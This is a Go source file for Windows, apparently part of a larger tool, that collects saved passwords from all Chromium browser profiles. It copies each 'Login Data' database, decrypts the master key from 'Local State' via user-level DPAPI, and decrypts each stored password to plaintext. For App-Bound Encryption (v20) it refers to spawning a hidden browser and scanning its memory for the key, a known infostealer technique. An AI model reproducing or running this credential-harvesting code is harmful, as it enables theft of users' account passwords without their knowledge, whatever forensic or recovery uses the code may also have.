//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"syscall"
	"unsafe"
)

// kernel32dll is shared with memkey_windows.go.
var kernel32dll = syscall.NewLazyDLL("kernel32.dll")

var (
	crypt32dll         = syscall.NewLazyDLL("crypt32.dll")
	cryptUnprotectData = crypt32dll.NewProc("CryptUnprotectData")
	localFree          = kernel32dll.NewProc("LocalFree")
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

// dpapi decrypts a DPAPI-protected blob using the current user's key (no admin).
func dpapi(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty input")
	}
	var out dataBlob
	in := dataBlob{cbData: uint32(len(data)), pbData: &data[0]}
	r, _, err := cryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&in)), 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)
	if r == 0 {
		return nil, fmt.Errorf("CryptUnprotectData: %w", err)
	}
	defer localFree.Call(uintptr(unsafe.Pointer(out.pbData)))
	result := make([]byte, out.cbData)
	copy(result, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
	return result, nil
}

// getKeyFromLocalState reads the AES-256 master key from a Chromium browser's
// Local State file and decrypts it with DPAPI (user-level, no admin required).
// This path handles v10 passwords on Chrome < 127 and all current Opera/Vivaldi/etc.
func getKeyFromLocalState(userDataDir string) ([]byte, error) {
	raw, err := os.ReadFile(filepath.Join(userDataDir, "Local State"))
	if err != nil {
		return nil, err
	}
	var ls struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(raw, &ls); err != nil {
		return nil, fmt.Errorf("parse Local State: %w", err)
	}
	if ls.OSCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("no encrypted_key in Local State")
	}
	encrypted, err := base64.StdEncoding.DecodeString(ls.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("base64 decode: %w", err)
	}
	// Chrome prepends "DPAPI" (5 bytes) before the actual DPAPI blob.
	if len(encrypted) < 5 || string(encrypted[:5]) != "DPAPI" {
		return nil, fmt.Errorf("unexpected Local State key format (no DPAPI prefix)")
	}
	return dpapi(encrypted[5:])
}

// ── Password decryption ───────────────────────────────────────────────────────

func decryptPassword(key, ciphertext []byte) (string, error) {
	if len(ciphertext) == 0 {
		return "", nil
	}
	if len(ciphertext) < 3 {
		return "", fmt.Errorf("ciphertext too short")
	}
	prefix := string(ciphertext[:3])
	if prefix != "v10" && prefix != "v20" {
		return "", fmt.Errorf("unknown ciphertext format")
	}
	if len(ciphertext) < 15 {
		return "", fmt.Errorf("ciphertext too short")
	}
	if key == nil {
		return "", fmt.Errorf("no AES key")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	plain, err := gcm.Open(nil, ciphertext[3:15], ciphertext[15:], nil)
	if err != nil {
		return "", err
	}
	return string(plain), nil
}

// ── Per-browser password scan ─────────────────────────────────────────────────

// scanChromiumPasswords reads saved passwords for one browser profile.
// cachedKey is shared across all profiles of the same browser so we only
// spawn the hidden browser process once per installation.
func scanChromiumPasswords(b chromiumBrowser, profile string, cachedKey *[]byte) ([]PasswordEntry, error) {
	dbPath := filepath.Join(b.userDataDir, profile, "Login Data")
	if _, err := os.Stat(dbPath); err != nil {
		return nil, nil
	}
	tmp, err := tempCopy(dbPath)
	if err != nil {
		return nil, fmt.Errorf("copy failed: %w", err)
	}
	defer os.Remove(tmp)

	db, err := newSQLiteReader(tmp)
	if err != nil {
		return nil, fmt.Errorf("open sqlite: %w", err)
	}
	rows, err := db.ReadTable("logins")
	if err != nil {
		return nil, fmt.Errorf("read logins: %w", err)
	}

	// Fetch the master key once per browser (shared via cachedKey pointer).
	// v10: try Local State DPAPI first (reliable, user-level, no admin).
	// v20: App-Bound Encryption — use spawn-hidden + heap scan.
	if *cachedKey == nil {
		for _, row := range rows {
			if len(row) < 6 {
				continue
			}
			blob, _ := row[5].([]byte)
			if len(blob) < 3 {
				continue
			}
			prefix := string(blob[:3])
			if prefix == "v10" {
				if k, err := getKeyFromLocalState(b.userDataDir); err == nil && tryDecryptKey(k, blob) {
					*cachedKey = k
					break
				}
				// Local State failed or key mismatch — fall through to spawn+scan
				if k, err := getKeyFromBrowserMemory(b.name, blob); err == nil {
					*cachedKey = k
				}
				break
			} else if prefix == "v20" {
				if k, err := getKeyFromBrowserMemory(b.name, blob); err == nil {
					*cachedKey = k
				}
				break
			}
		}
	}

	source := b.name
	if profile != "Default" {
		source = fmt.Sprintf("%s (%s)", b.name, profile)
	}

	var entries []PasswordEntry
	for _, row := range rows {
		if len(row) < 6 {
			continue
		}
		originURL, _ := row[0].(string)
		username, _ := row[3].(string)
		pwdBlob, _ := row[5].([]byte)
		if originURL == "" {
			continue
		}
		password, err := decryptPassword(*cachedKey, pwdBlob)
		if err != nil {
			password = "[decrypt failed]"
		}
		entries = append(entries, PasswordEntry{
			URL:      originURL,
			Username: username,
			Password: password,
			Source:   source,
		})
	}
	return entries, nil
}

// ── scanAllPasswords ──────────────────────────────────────────────────────────

func scanAllPasswords(env envPaths) ([]PasswordEntry, []string) {
	var (
		all    []PasswordEntry
		errors []string
	)

	for _, b := range resolvedChromiumBrowsers(env) {
		if _, err := os.Stat(b.userDataDir); err != nil {
			continue
		}
		// cachedKey is shared across all profiles of this browser so we only
		// spawn the hidden instance once per browser installation.
		var cachedKey []byte
		for _, profile := range profilesInUserData(b.userDataDir) {
			entries, err := scanChromiumPasswords(b, profile, &cachedKey)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s/%s passwords: %v", b.name, profile, err))
				continue
			}
			all = append(all, entries...)
		}
	}

	domainKey := func(rawURL string) string {
		s := rawURL
		if i := strings.Index(s, "://"); i >= 0 {
			s = s[i+3:]
		}
		return strings.ToLower(strings.TrimPrefix(s, "www."))
	}
	sort.Slice(all, func(i, j int) bool {
		return domainKey(all[i].URL) < domainKey(all[j].URL)
	})

	return all, errors
}
